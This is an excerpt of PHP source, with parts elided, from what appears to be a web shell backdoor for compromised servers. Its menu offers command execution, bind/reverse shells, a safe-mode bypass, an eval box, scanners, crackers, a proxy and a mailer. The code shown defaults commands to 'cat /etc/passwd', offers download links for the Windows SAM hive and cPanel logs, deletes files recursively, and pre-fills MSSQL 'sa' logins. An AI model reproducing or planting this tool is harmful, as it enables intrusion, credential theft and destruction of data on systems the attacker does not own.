...
function brshelL()
{
    ...
    if (!empty($_REQUEST['port']) && ($_REQUEST['port'] <= 65535) && ($_REQUEST['port'] >= 1)) {
        ...
        if ($windows) echo 'EXE'; else echo 'C';
...
function webshelL()
{
    ...
    if (!empty($_REQUEST['cmd'])) echo htmlspecialchars(($_REQUEST['cmd'])); elseif (!$windows) echo "cat /etc/passwd";
...
function maileR()
{
    ...
    if (!empty($_ENV['SERVER_ADMIN'])) echo $_ENV['SERVER_ADMIN']; else echo 'admin@' . getenv('HTTP_HOST');
...
function sysinfO()
{
    ...
    if (!empty($_SERVER['USERDOMAIN'])) echo $_SERVER['USERDOMAIN']; else echo "Unknow";
    echo "</td></tr><tr>${t6}User name:</td><td bgcolor='#666666'>$cuser</td></tr>";
    if ($windows) {
        ...
        if (is_readable(($sam))) echo "<a href='" . hlinK("?workingdiR=$sysroot\\system32\\config&downloaD=sam") . "'>Readable</a>"; else echo 'Not readable';
        echo '</td></tr>';
    } else {
        ...
        if (is_readable('/etc/passwd')) echo "<a href='" . hlinK("seC=edit&filE=/etc/passwd&workingdiR=$cwd") . "'>Readable</a>"; else echo 'Not readable';
        ...
        if (file_exists('/var/cpanel/accounting.log')) {
            if (is_readable('/var/cpanel/accounting.log')) echo "<a href='" . hlinK("seC=edit&filE=/var/cpanel/accounting.log&workingdiR=$cwd") . "'>Readable</a>"; else echo 'Not readable';
        } else echo 'Not found';
        echo ')</td></tr>';
    }
    ...
    if (function_exists('zend_version')) echo "<a href='?=" . zend_logo_guid() . "' target='_blank'>" . zend_version() . '</a>'; else echo 'Not Found';
    ...
    if (!empty($ds)) echo "$ds "; else echo 'Nothing';
...
function listdiR($cwd, $task)
{
    ...
    while ($cont = readdir($dh)) {
        ...
        switch ($task) {
            ...
            case '8':
                {
                    if (is_dir($adr)) rmdir($adr); else unlink($adr);
                    rmdir($cwd);
                    break;
                }
        }
...
function filemanageR()
{
    ...
    if (!empty($_REQUEST['task'])) {
        ...
        if (!empty($_REQUEST['deL'])) {
            if (is_dir($_REQUEST['deL'])) listdiR($_REQUEST['deL'], 8); else unlink($_REQUEST['deL']);
        }
        ...
        if ($dirhandle = opendir($cwd)) {
            ...
            foreach ($dir as $dn) {
                ...
                if (is_writeable($dn)) echo $tdw; elseif (!is_readable($dn)) echo $tdnr;
                else echo $cl2;
                echo "<a href='" . hlinK('seC=fm&workingdiR=' . realpath($dn)) . "'>";
                if (strlen($dn) > 45) echo substr($dn, 0, 42) . '...'; else echo $dn;
                echo '</a>';
                echo $cl1 . "$own</td>";
                echo $cl1 . "$mdate</td>";
                echo $cl1 . "$adate</td>";
            ...
            foreach ($file as $fn) {
                ...
                if (is_writeable($fn)) echo $tdw; elseif (!is_readable($fn)) echo $tdnr;
                else echo $cl2;
                echo "<a href='" . hlinK("seC=openit&namE=$fn&workingdiR=$cwd") . "'>";
                if (strlen($fn) > 45) echo substr($fn, 0, 42) . '...'; else echo $fn;
                echo '</a>';
                echo $cl1 . "$own</td>";
                echo $cl1 . "$mdate</td>";
                echo $cl1 . "$adate</td>";
            ...
            foreach ($link as $ln) {
                ...
                if (is_writeable($ln)) echo $tdw; elseif (!is_readable($ln)) echo $tdnr;
                else echo $cl2;
                echo "<a href='" . hlinK("seC=openit&namE=$ln&workingdiR=$cwd") . "'>";
                if (strlen($ln) > 45) echo substr($ln, 0, 42) . '...'; else echo $ln;
                echo '</a>';
                echo $cl1 . "$own</td>";
                echo $cl1 . "$mdate</td>";
                echo $cl1 . "$adate</td>";
        ...
        if (is_writeable($cwd)) echo '#006E00'; elseif (!is_readable($cwd)) echo '#800000';
        else '#333333';
...
function pr0xy()
{
    ...
    if (!!empty($_REQUEST['urL'])) echo 'http://www.edpsciences.org/htbin/ipaddress'; else echo htmlspecialchars($_REQUEST['urL']);
...
function sqlclienT()
{
    ...
    if (isset($_REQUEST['pasS'])) echo htmlspecialchars($_REQUEST['pasS']); else echo '123456';
...
function toolS()
{
    ...
    if (!empty($_REQUEST['serveR'])) echo htmlspecialchars($_REQUEST['serveR']); else echo 'whois.geektools.com';
    ...
    if (!empty($_REQUEST['domaiN'])) echo htmlspecialchars($_REQUEST['domaiN']); else echo 'google.com';
    ...
    if (!empty($_REQUEST['urL'])) echo htmlspecialchars($_REQUEST['urL']); else echo 'http://netjackal.by.ru/index.htm';
...
function safemodE()
{
    ...
    if (!empty($_REQUEST['serveR'])) echo htmlspecialchars($_REQUEST['serveR']); else echo 'localhost';
    echo "' name=serveR size=35></td></tr><tr><td width='20%' bgcolor='#808080'>Username:</td><td bgcolor='#808080'><input type=text name=useR value='";
    if (!empty($_REQUEST['useR'])) echo htmlspecialchars($_REQUEST['useR']); else echo 'sa';
    ...
    if (!empty($_REQUEST['coM'])) echo htmlspecialchars($_REQUEST['coM']); else echo 'dir c:';
    echo "' size=35></td></tr><tr><td bgcolor='#666666'>Database:</td><td bgcolor='#666666'><input type=text name=dB value='";
    if (isset($_REQUEST['dB'])) echo htmlspecialchars($_REQUEST['dB']); else echo 'master';
...
function opensesS($name)
{
    ...
    foreach ($var as $v) {
        ...
        $c = explode(':', $t[1]);
        $y = '';
        if ($c[0] == 'i') $y = 'Integer'; elseif ($c[0] == 's') $y = 'String';
...
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#282828"
       bgcolor="#333333" width="100%">
    <tr>
        <td><a href=javascript:history.back(1)>[Back]</a> - <a
                    href="<?php echo hlinK("seC=sysinfo&workingdiR=$cwd"); ?>">[Info]</a> - <a
                    href="<?php echo hlinK("seC=fm&workingdiR=$cwd"); ?>">[File manager]</a> - <a
                    href="<?php echo hlinK("seC=edit&workingdiR=$cwd"); ?>">[Editor]</a> - <a
                    href="<?php echo hlinK("seC=webshell&workingdiR=$cwd"); ?>">[Web shell]</a> - <a
                    href="<?php echo hlinK("seC=br&workingdiR=$cwd"); ?>">[B/R shell]</a> - <a
                    href="<?php echo hlinK("seC=asm&workingdiR=$cwd"); ?>">[Safe-mode]</a> - <a
                    href="<?php echo hlinK("seC=sqlcl&workingdiR=$cwd"); ?>">[SQL]</a> - <a
                    href="<?php echo hlinK("seC=ftpc&workingdiR=$cwd"); ?>">[FTP]</a> - <a
                    href="<?php echo hlinK("seC=mailer&workingdiR=$cwd"); ?>">[Mail]</a> - <a
                    href="<?php echo hlinK("seC=eval&workingdiR=$cwd"); ?>">[Evaler]</a> - <a
                    href="<?php echo hlinK("seC=sc&workingdiR=$cwd"); ?>">[Scanners]</a> - <a
                    href="<?php echo hlinK("seC=cr&workingdiR=$cwd"); ?>">[Crackers]</a> - <a
                    href="<?php echo hlinK("seC=px&workingdiR=$cwd"); ?>">[Pr0xy]</a> - <a
                    href="<?php echo hlinK("seC=tools&workingdiR=$cwd"); ?>">[Tools]</a> - <a
                    href="<?php echo hlinK("seC=calc&workingdiR=$cwd"); ?>">[Convert]</a> - <a
                    href="<?php echo hlinK("seC=about&workingdiR=$cwd"); ?>">[About]</a> <?php if (isset($_COOKIE['passw'])) echo "- [<a href='" . hlinK("seC=logout") . "'>Logout</a>]"; ?>
        </td>
    </tr>
</table>
<hr size=1 noshade>
